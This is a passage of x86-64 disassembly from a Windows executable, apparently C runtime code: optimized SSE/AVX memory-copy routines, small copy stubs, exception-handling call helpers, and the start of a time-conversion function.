   14000506b:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000506e:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   140005073:	4c 89 00             	mov    %r8,(%rax)
   140005076:	89 48 08             	mov    %ecx,0x8(%rax)
   140005079:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000507e:	c3                   	ret
   14000507f:	0f b7 0a             	movzwl (%rdx),%ecx
   140005082:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   140005087:	66 89 08             	mov    %cx,(%rax)
   14000508a:	44 88 40 02          	mov    %r8b,0x2(%rax)
   14000508e:	c3                   	ret
   14000508f:	90                   	nop
   140005090:	4c 8b 02             	mov    (%rdx),%r8
   140005093:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140005096:	44 0f b6 4a 0c       	movzbl 0xc(%rdx),%r9d
   14000509b:	4c 89 00             	mov    %r8,(%rax)
   14000509e:	89 48 08             	mov    %ecx,0x8(%rax)
   1400050a1:	44 88 48 0c          	mov    %r9b,0xc(%rax)
   1400050a5:	c3                   	ret
   1400050a6:	4c 8b 02             	mov    (%rdx),%r8
   1400050a9:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   1400050ad:	4c 89 00             	mov    %r8,(%rax)
   1400050b0:	66 89 48 08          	mov    %cx,0x8(%rax)
   1400050b4:	c3                   	ret
   1400050b5:	4c 8b 02             	mov    (%rdx),%r8
   1400050b8:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   1400050bc:	4c 89 00             	mov    %r8,(%rax)
   1400050bf:	88 48 08             	mov    %cl,0x8(%rax)
   1400050c2:	c3                   	ret
   1400050c3:	4c 8b 02             	mov    (%rdx),%r8
   1400050c6:	8b 4a 08             	mov    0x8(%rdx),%ecx
   1400050c9:	4c 89 00             	mov    %r8,(%rax)
   1400050cc:	89 48 08             	mov    %ecx,0x8(%rax)
   1400050cf:	c3                   	ret
   1400050d0:	8b 0a                	mov    (%rdx),%ecx
   1400050d2:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   1400050d7:	89 08                	mov    %ecx,(%rax)
   1400050d9:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   1400050de:	c3                   	ret
   1400050df:	8b 0a                	mov    (%rdx),%ecx
   1400050e1:	44 0f b6 42 04       	movzbl 0x4(%rdx),%r8d
   1400050e6:	89 08                	mov    %ecx,(%rax)
   1400050e8:	44 88 40 04          	mov    %r8b,0x4(%rax)
   1400050ec:	c3                   	ret
   1400050ed:	48 8b 0a             	mov    (%rdx),%rcx
   1400050f0:	48 89 08             	mov    %rcx,(%rax)
   1400050f3:	c3                   	ret
   1400050f4:	0f b6 0a             	movzbl (%rdx),%ecx
   1400050f7:	88 08                	mov    %cl,(%rax)
   1400050f9:	c3                   	ret
   1400050fa:	8b 0a                	mov    (%rdx),%ecx
   1400050fc:	89 08                	mov    %ecx,(%rax)
   1400050fe:	c3                   	ret
   1400050ff:	90                   	nop
   140005100:	49 83 f8 20          	cmp    $0x20,%r8
   140005104:	77 17                	ja     0x14000511d
   140005106:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   14000510a:	f3 42 0f 6f 54 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm2
   140005111:	f3 0f 7f 09          	movdqu %xmm1,(%rcx)
   140005115:	f3 42 0f 7f 54 01 f0 	movdqu %xmm2,-0x10(%rcx,%r8,1)
   14000511c:	c3                   	ret
   14000511d:	48 3b d1             	cmp    %rcx,%rdx
   140005120:	73 0e                	jae    0x140005130
   140005122:	4e 8d 0c 02          	lea    (%rdx,%r8,1),%r9
   140005126:	49 3b c9             	cmp    %r9,%rcx
   140005129:	0f 82 41 04 00 00    	jb     0x140005570
   14000512f:	90                   	nop
   140005130:	83 3d e1 4e 01 00 03 	cmpl   $0x3,0x14ee1(%rip)        # 0x14001a018
   140005137:	0f 82 e3 02 00 00    	jb     0x140005420
   14000513d:	49 81 f8 00 20 00 00 	cmp    $0x2000,%r8
   140005144:	76 16                	jbe    0x14000515c
   140005146:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   14000514d:	77 0d                	ja     0x14000515c
   14000514f:	f6 05 1e 5f 01 00 02 	testb  $0x2,0x15f1e(%rip)        # 0x14001b074
   140005156:	0f 85 64 fe ff ff    	jne    0x140004fc0
   14000515c:	c5 fe 6f 02          	vmovdqu (%rdx),%ymm0
   140005160:	c4 a1 7e 6f 6c 02 e0 	vmovdqu -0x20(%rdx,%r8,1),%ymm5
   140005167:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000516e:	0f 86 c4 00 00 00    	jbe    0x140005238
   140005174:	4c 8b c9             	mov    %rcx,%r9
   140005177:	49 83 e1 1f          	and    $0x1f,%r9
   14000517b:	49 83 e9 20          	sub    $0x20,%r9
   14000517f:	49 2b c9             	sub    %r9,%rcx
   140005182:	49 2b d1             	sub    %r9,%rdx
   140005185:	4d 03 c1             	add    %r9,%r8
   140005188:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000518f:	0f 86 a3 00 00 00    	jbe    0x140005238
   140005195:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   14000519c:	0f 87 3e 01 00 00    	ja     0x1400052e0
   1400051a2:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400051a9:	1f 84 00 00 00 00 00 
   1400051b0:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   1400051b4:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   1400051b9:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   1400051be:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   1400051c3:	c5 fd 7f 09          	vmovdqa %ymm1,(%rcx)
   1400051c7:	c5 fd 7f 51 20       	vmovdqa %ymm2,0x20(%rcx)
   1400051cc:	c5 fd 7f 59 40       	vmovdqa %ymm3,0x40(%rcx)
   1400051d1:	c5 fd 7f 61 60       	vmovdqa %ymm4,0x60(%rcx)
   1400051d6:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   1400051dd:	00 
   1400051de:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   1400051e5:	00 
   1400051e6:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   1400051ed:	00 
   1400051ee:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   1400051f5:	00 
   1400051f6:	c5 fd 7f 89 80 00 00 	vmovdqa %ymm1,0x80(%rcx)
   1400051fd:	00 
   1400051fe:	c5 fd 7f 91 a0 00 00 	vmovdqa %ymm2,0xa0(%rcx)
   140005205:	00 
   140005206:	c5 fd 7f 99 c0 00 00 	vmovdqa %ymm3,0xc0(%rcx)
   14000520d:	00 
   14000520e:	c5 fd 7f a1 e0 00 00 	vmovdqa %ymm4,0xe0(%rcx)
   140005215:	00 
   140005216:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000521d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   140005224:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000522b:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140005232:	0f 83 78 ff ff ff    	jae    0x1400051b0
   140005238:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000523c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   140005240:	4d 8b d9             	mov    %r9,%r11
   140005243:	49 c1 eb 05          	shr    $0x5,%r11
   140005247:	47 8b 9c 9a f0 d0 01 	mov    0x1d0f0(%r10,%r11,4),%r11d
   14000524e:	00 
   14000524f:	4d 03 da             	add    %r10,%r11
   140005252:	41 ff e3             	jmp    *%r11
   140005255:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   14000525c:	ff ff ff 
   14000525f:	c4 a1 7e 7f 8c 09 00 	vmovdqu %ymm1,-0x100(%rcx,%r9,1)
   140005266:	ff ff ff 
   140005269:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   140005270:	ff ff ff 
   140005273:	c4 a1 7e 7f 8c 09 20 	vmovdqu %ymm1,-0xe0(%rcx,%r9,1)
   14000527a:	ff ff ff 
   14000527d:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   140005284:	ff ff ff 
   140005287:	c4 a1 7e 7f 8c 09 40 	vmovdqu %ymm1,-0xc0(%rcx,%r9,1)
   14000528e:	ff ff ff 
   140005291:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   140005298:	ff ff ff 
   14000529b:	c4 a1 7e 7f 8c 09 60 	vmovdqu %ymm1,-0xa0(%rcx,%r9,1)
   1400052a2:	ff ff ff 
   1400052a5:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   1400052ac:	c4 a1 7e 7f 4c 09 80 	vmovdqu %ymm1,-0x80(%rcx,%r9,1)
   1400052b3:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   1400052ba:	c4 a1 7e 7f 4c 09 a0 	vmovdqu %ymm1,-0x60(%rcx,%r9,1)
   1400052c1:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   1400052c8:	c4 a1 7e 7f 4c 09 c0 	vmovdqu %ymm1,-0x40(%rcx,%r9,1)
   1400052cf:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   1400052d6:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   1400052da:	c5 f8 77             	vzeroupper
   1400052dd:	c3                   	ret
   1400052de:	66 90                	xchg   %ax,%ax
   1400052e0:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   1400052e4:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   1400052e9:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   1400052ee:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   1400052f3:	c5 fd e7 09          	vmovntdq %ymm1,(%rcx)
   1400052f7:	c5 fd e7 51 20       	vmovntdq %ymm2,0x20(%rcx)
   1400052fc:	c5 fd e7 59 40       	vmovntdq %ymm3,0x40(%rcx)
   140005301:	c5 fd e7 61 60       	vmovntdq %ymm4,0x60(%rcx)
   140005306:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   14000530d:	00 
   14000530e:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   140005315:	00 
   140005316:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   14000531d:	00 
   14000531e:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   140005325:	00 
   140005326:	c5 fd e7 89 80 00 00 	vmovntdq %ymm1,0x80(%rcx)
   14000532d:	00 
   14000532e:	c5 fd e7 91 a0 00 00 	vmovntdq %ymm2,0xa0(%rcx)
   140005335:	00 
   140005336:	c5 fd e7 99 c0 00 00 	vmovntdq %ymm3,0xc0(%rcx)
   14000533d:	00 
   14000533e:	c5 fd e7 a1 e0 00 00 	vmovntdq %ymm4,0xe0(%rcx)
   140005345:	00 
   140005346:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000534d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   140005354:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000535b:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140005362:	0f 83 78 ff ff ff    	jae    0x1400052e0
   140005368:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000536c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   140005370:	4d 8b d9             	mov    %r9,%r11
   140005373:	49 c1 eb 05          	shr    $0x5,%r11
   140005377:	47 8b 9c 9a 14 d1 01 	mov    0x1d114(%r10,%r11,4),%r11d
   14000537e:	00 
   14000537f:	4d 03 da             	add    %r10,%r11
   140005382:	41 ff e3             	jmp    *%r11
   140005385:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   14000538c:	ff ff ff 
   14000538f:	c4 a1 7d e7 8c 09 00 	vmovntdq %ymm1,-0x100(%rcx,%r9,1)
   140005396:	ff ff ff 
   140005399:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   1400053a0:	ff ff ff 
   1400053a3:	c4 a1 7d e7 8c 09 20 	vmovntdq %ymm1,-0xe0(%rcx,%r9,1)
   1400053aa:	ff ff ff 
   1400053ad:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   1400053b4:	ff ff ff 
   1400053b7:	c4 a1 7d e7 8c 09 40 	vmovntdq %ymm1,-0xc0(%rcx,%r9,1)
   1400053be:	ff ff ff 
   1400053c1:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   1400053c8:	ff ff ff 
   1400053cb:	c4 a1 7d e7 8c 09 60 	vmovntdq %ymm1,-0xa0(%rcx,%r9,1)
   1400053d2:	ff ff ff 
   1400053d5:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   1400053dc:	c4 a1 7d e7 4c 09 80 	vmovntdq %ymm1,-0x80(%rcx,%r9,1)
   1400053e3:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   1400053ea:	c4 a1 7d e7 4c 09 a0 	vmovntdq %ymm1,-0x60(%rcx,%r9,1)
   1400053f1:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   1400053f8:	c4 a1 7d e7 4c 09 c0 	vmovntdq %ymm1,-0x40(%rcx,%r9,1)
   1400053ff:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   140005406:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000540a:	0f ae f8             	sfence
   14000540d:	c5 f8 77             	vzeroupper
   140005410:	c3                   	ret
   140005411:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140005418:	0f 1f 84 00 00 00 00 
   14000541f:	00 
   140005420:	49 81 f8 00 08 00 00 	cmp    $0x800,%r8
   140005427:	76 0d                	jbe    0x140005436
   140005429:	f6 05 44 5c 01 00 02 	testb  $0x2,0x15c44(%rip)        # 0x14001b074
   140005430:	0f 85 8a fb ff ff    	jne    0x140004fc0
   140005436:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   14000543a:	f3 42 0f 6f 6c 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm5
   140005441:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   140005448:	0f 86 8e 00 00 00    	jbe    0x1400054dc
   14000544e:	4c 8b c9             	mov    %rcx,%r9
   140005451:	49 83 e1 0f          	and    $0xf,%r9
   140005455:	49 83 e9 10          	sub    $0x10,%r9
   140005459:	49 2b c9             	sub    %r9,%rcx
   14000545c:	49 2b d1             	sub    %r9,%rdx
   14000545f:	4d 03 c1             	add    %r9,%r8
   140005462:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   140005469:	76 71                	jbe    0x1400054dc
   14000546b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005470:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   140005474:	f3 0f 6f 52 10       	movdqu 0x10(%rdx),%xmm2
   140005479:	f3 0f 6f 5a 20       	movdqu 0x20(%rdx),%xmm3
   14000547e:	f3 0f 6f 62 30       	movdqu 0x30(%rdx),%xmm4
   140005483:	66 0f 7f 09          	movdqa %xmm1,(%rcx)
   140005487:	66 0f 7f 51 10       	movdqa %xmm2,0x10(%rcx)
   14000548c:	66 0f 7f 59 20       	movdqa %xmm3,0x20(%rcx)
   140005491:	66 0f 7f 61 30       	movdqa %xmm4,0x30(%rcx)
   140005496:	f3 0f 6f 4a 40       	movdqu 0x40(%rdx),%xmm1
   14000549b:	f3 0f 6f 52 50       	movdqu 0x50(%rdx),%xmm2
   1400054a0:	f3 0f 6f 5a 60       	movdqu 0x60(%rdx),%xmm3
   1400054a5:	f3 0f 6f 62 70       	movdqu 0x70(%rdx),%xmm4
   1400054aa:	66 0f 7f 49 40       	movdqa %xmm1,0x40(%rcx)
   1400054af:	66 0f 7f 51 50       	movdqa %xmm2,0x50(%rcx)
   1400054b4:	66 0f 7f 59 60       	movdqa %xmm3,0x60(%rcx)
   1400054b9:	66 0f 7f 61 70       	movdqa %xmm4,0x70(%rcx)
   1400054be:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   1400054c5:	48 81 c2 80 00 00 00 	add    $0x80,%rdx
   1400054cc:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   1400054d3:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   1400054da:	73 94                	jae    0x140005470
   1400054dc:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   1400054e0:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   1400054e4:	4d 8b d9             	mov    %r9,%r11
   1400054e7:	49 c1 eb 04          	shr    $0x4,%r11
   1400054eb:	47 8b 9c 9a 38 d1 01 	mov    0x1d138(%r10,%r11,4),%r11d
   1400054f2:	00 
   1400054f3:	4d 03 da             	add    %r10,%r11
   1400054f6:	41 ff e3             	jmp    *%r11
   1400054f9:	f3 42 0f 6f 4c 0a 80 	movdqu -0x80(%rdx,%r9,1),%xmm1
   140005500:	f3 42 0f 7f 4c 09 80 	movdqu %xmm1,-0x80(%rcx,%r9,1)
   140005507:	f3 42 0f 6f 4c 0a 90 	movdqu -0x70(%rdx,%r9,1),%xmm1
   14000550e:	f3 42 0f 7f 4c 09 90 	movdqu %xmm1,-0x70(%rcx,%r9,1)
   140005515:	f3 42 0f 6f 4c 0a a0 	movdqu -0x60(%rdx,%r9,1),%xmm1
   14000551c:	f3 42 0f 7f 4c 09 a0 	movdqu %xmm1,-0x60(%rcx,%r9,1)
   140005523:	f3 42 0f 6f 4c 0a b0 	movdqu -0x50(%rdx,%r9,1),%xmm1
   14000552a:	f3 42 0f 7f 4c 09 b0 	movdqu %xmm1,-0x50(%rcx,%r9,1)
   140005531:	f3 42 0f 6f 4c 0a c0 	movdqu -0x40(%rdx,%r9,1),%xmm1
   140005538:	f3 42 0f 7f 4c 09 c0 	movdqu %xmm1,-0x40(%rcx,%r9,1)
   14000553f:	f3 42 0f 6f 4c 0a d0 	movdqu -0x30(%rdx,%r9,1),%xmm1
   140005546:	f3 42 0f 7f 4c 09 d0 	movdqu %xmm1,-0x30(%rcx,%r9,1)
   14000554d:	f3 42 0f 6f 4c 0a e0 	movdqu -0x20(%rdx,%r9,1),%xmm1
   140005554:	f3 42 0f 7f 4c 09 e0 	movdqu %xmm1,-0x20(%rcx,%r9,1)
   14000555b:	f3 42 0f 7f 6c 01 f0 	movdqu %xmm5,-0x10(%rcx,%r8,1)
   140005562:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   140005566:	c3                   	ret
   140005567:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000556e:	00 00 
   140005570:	4c 8b d9             	mov    %rcx,%r11
   140005573:	4c 8b d2             	mov    %rdx,%r10
   140005576:	48 2b d1             	sub    %rcx,%rdx
   140005579:	49 03 c8             	add    %r8,%rcx
   14000557c:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   140005581:	48 83 e9 10          	sub    $0x10,%rcx
   140005585:	49 83 e8 10          	sub    $0x10,%r8
   140005589:	f6 c1 0f             	test   $0xf,%cl
   14000558c:	74 17                	je     0x1400055a5
   14000558e:	48 8b c1             	mov    %rcx,%rax
   140005591:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   140005595:	0f 10 c8             	movups %xmm0,%xmm1
   140005598:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   14000559c:	0f 11 08             	movups %xmm1,(%rax)
   14000559f:	4c 8b c1             	mov    %rcx,%r8
   1400055a2:	4d 2b c3             	sub    %r11,%r8
   1400055a5:	4d 8b c8             	mov    %r8,%r9
   1400055a8:	49 c1 e9 07          	shr    $0x7,%r9
   1400055ac:	74 6f                	je     0x14000561d
   1400055ae:	0f 29 01             	movaps %xmm0,(%rcx)
   1400055b1:	eb 14                	jmp    0x1400055c7
   1400055b3:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400055ba:	84 00 00 00 00 00 
   1400055c0:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   1400055c4:	0f 29 09             	movaps %xmm1,(%rcx)
   1400055c7:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   1400055cc:	0f 10 4c 11 e0       	movups -0x20(%rcx,%rdx,1),%xmm1
   1400055d1:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   1400055d8:	0f 29 41 70          	movaps %xmm0,0x70(%rcx)
   1400055dc:	0f 29 49 60          	movaps %xmm1,0x60(%rcx)
   1400055e0:	0f 10 44 11 50       	movups 0x50(%rcx,%rdx,1),%xmm0
   1400055e5:	0f 10 4c 11 40       	movups 0x40(%rcx,%rdx,1),%xmm1
   1400055ea:	49 ff c9             	dec    %r9
   1400055ed:	0f 29 41 50          	movaps %xmm0,0x50(%rcx)
   1400055f1:	0f 29 49 40          	movaps %xmm1,0x40(%rcx)
   1400055f5:	0f 10 44 11 30       	movups 0x30(%rcx,%rdx,1),%xmm0
   1400055fa:	0f 10 4c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm1
   1400055ff:	0f 29 41 30          	movaps %xmm0,0x30(%rcx)
   140005603:	0f 29 49 20          	movaps %xmm1,0x20(%rcx)
   140005607:	0f 10 44 11 10       	movups 0x10(%rcx,%rdx,1),%xmm0
   14000560c:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   140005610:	75 ae                	jne    0x1400055c0
   140005612:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   140005616:	49 83 e0 7f          	and    $0x7f,%r8
   14000561a:	0f 28 c1             	movaps %xmm1,%xmm0
   14000561d:	4d 8b c8             	mov    %r8,%r9
   140005620:	49 c1 e9 04          	shr    $0x4,%r9
   140005624:	74 1a                	je     0x140005640
   140005626:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000562d:	00 00 00 
   140005630:	0f 11 01             	movups %xmm0,(%rcx)
   140005633:	48 83 e9 10          	sub    $0x10,%rcx
   140005637:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   14000563b:	49 ff c9             	dec    %r9
   14000563e:	75 f0                	jne    0x140005630
   140005640:	49 83 e0 0f          	and    $0xf,%r8
   140005644:	74 08                	je     0x14000564e
   140005646:	41 0f 10 0a          	movups (%r10),%xmm1
   14000564a:	41 0f 11 0b          	movups %xmm1,(%r11)
   14000564e:	0f 11 01             	movups %xmm0,(%rcx)
   140005651:	49 8b c3             	mov    %r11,%rax
   140005654:	c3                   	ret
   140005655:	cc                   	int3
   140005656:	cc                   	int3
   140005657:	cc                   	int3
   140005658:	cc                   	int3
   140005659:	cc                   	int3
   14000565a:	cc                   	int3
   14000565b:	cc                   	int3
   14000565c:	cc                   	int3
   14000565d:	cc                   	int3
   14000565e:	cc                   	int3
   14000565f:	cc                   	int3
   140005660:	cc                   	int3
   140005661:	cc                   	int3
   140005662:	cc                   	int3
   140005663:	cc                   	int3
   140005664:	cc                   	int3
   140005665:	cc                   	int3
   140005666:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000566d:	00 00 00 
   140005670:	48 83 ec 28          	sub    $0x28,%rsp
   140005674:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140005679:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000567e:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   140005683:	48 8b 12             	mov    (%rdx),%rdx
   140005686:	48 8b c1             	mov    %rcx,%rax
   140005689:	e8 e2 f3 ff ff       	call   0x140004a70
   14000568e:	ff d0                	call   *%rax
   140005690:	e8 0b f4 ff ff       	call   0x140004aa0
   140005695:	48 8b c8             	mov    %rax,%rcx
   140005698:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   14000569d:	48 8b 12             	mov    (%rdx),%rdx
   1400056a0:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400056a6:	e8 c5 f3 ff ff       	call   0x140004a70
   1400056ab:	48 83 c4 28          	add    $0x28,%rsp
   1400056af:	c3                   	ret
   1400056b0:	cc                   	int3
   1400056b1:	cc                   	int3
   1400056b2:	cc                   	int3
   1400056b3:	cc                   	int3
   1400056b4:	cc                   	int3
   1400056b5:	cc                   	int3
   1400056b6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400056bd:	00 00 00 
   1400056c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400056c4:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400056c9:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   1400056ce:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   1400056d3:	48 8b 12             	mov    (%rdx),%rdx
   1400056d6:	48 8b c1             	mov    %rcx,%rax
   1400056d9:	e8 92 f3 ff ff       	call   0x140004a70
   1400056de:	ff d0                	call   *%rax
   1400056e0:	e8 bb f3 ff ff       	call   0x140004aa0
   1400056e5:	48 83 c4 28          	add    $0x28,%rsp
   1400056e9:	c3                   	ret
   1400056ea:	cc                   	int3
   1400056eb:	cc                   	int3
   1400056ec:	cc                   	int3
   1400056ed:	cc                   	int3
   1400056ee:	cc                   	int3
   1400056ef:	cc                   	int3
   1400056f0:	48 83 ec 28          	sub    $0x28,%rsp
   1400056f4:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400056f9:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   1400056fe:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   140005703:	48 8b 12             	mov    (%rdx),%rdx
   140005706:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000570c:	e8 5f f3 ff ff       	call   0x140004a70
   140005711:	48 83 c4 28          	add    $0x28,%rsp
   140005715:	c3                   	ret
   140005716:	cc                   	int3
   140005717:	cc                   	int3
   140005718:	cc                   	int3
   140005719:	cc                   	int3
   14000571a:	cc                   	int3
   14000571b:	cc                   	int3
   14000571c:	0f 1f 40 00          	nopl   0x0(%rax)
   140005720:	48 83 ec 28          	sub    $0x28,%rsp
   140005724:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140005729:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000572e:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   140005733:	44 89 4c 24 48       	mov    %r9d,0x48(%rsp)
   140005738:	45 8b c1             	mov    %r9d,%r8d
   14000573b:	48 8b c1             	mov    %rcx,%rax
   14000573e:	e8 2d f3 ff ff       	call   0x140004a70
   140005743:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140005748:	ff d0                	call   *%rax
   14000574a:	e8 51 f3 ff ff       	call   0x140004aa0
   14000574f:	48 8b c8             	mov    %rax,%rcx
   140005752:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   140005757:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000575d:	e8 0e f3 ff ff       	call   0x140004a70
   140005762:	48 83 c4 28          	add    $0x28,%rsp
   140005766:	c3                   	ret
   140005767:	cc                   	int3
   140005768:	40 53                	rex push %rbx
   14000576a:	48 83 ec 20          	sub    $0x20,%rsp
   14000576e:	8b d9                	mov    %ecx,%ebx
   140005770:	e8 ef 19 00 00       	call   0x140007164
   140005775:	89 58 28             	mov    %ebx,0x28(%rax)
   140005778:	48 83 c4 20          	add    $0x20,%rsp
   14000577c:	5b                   	pop    %rbx
   14000577d:	c3                   	ret
   14000577e:	cc                   	int3
   14000577f:	cc                   	int3
   140005780:	40 53                	rex push %rbx
   140005782:	48 83 ec 20          	sub    $0x20,%rsp
   140005786:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000578c:	48 8b d9             	mov    %rcx,%rbx
   14000578f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005794:	ff 15 26 9b 00 00    	call   *0x9b26(%rip)        # 0x14000f2c0
   14000579a:	48 b9 00 80 c1 2a 21 	movabs $0xfe624e212ac18000,%rcx
   1400057a1:	4e 62 fe 
   1400057a4:	48 b8 00 80 47 dd 78 	movabs $0x483f078dd478000,%rax
   1400057ab:	f0 83 04 
   1400057ae:	48 03 4c 24 30       	add    0x30(%rsp),%rcx
   1400057b3:	48 3b c8             	cmp    %rax,%rcx
   1400057b6:	7d 20                	jge    0x1400057d8
   1400057b8:	48 b8 bd 42 7a e5 d5 	movabs $0xd6bf94d5e57a42bd,%rax
   1400057bf:	94 bf d6 
   1400057c2:	48 f7 e9             	imul   %rcx
   1400057c5:	48 03 d1             	add    %rcx,%rdx
   1400057c8:	48 c1 fa 17          	sar    $0x17,%rdx
   1400057cc:	48 8b c2             	mov    %rdx,%rax
   1400057cf:	48 c1 e8 3f          	shr    $0x3f,%rax
   1400057d3:	48 03 d0             	add    %rax,%rdx
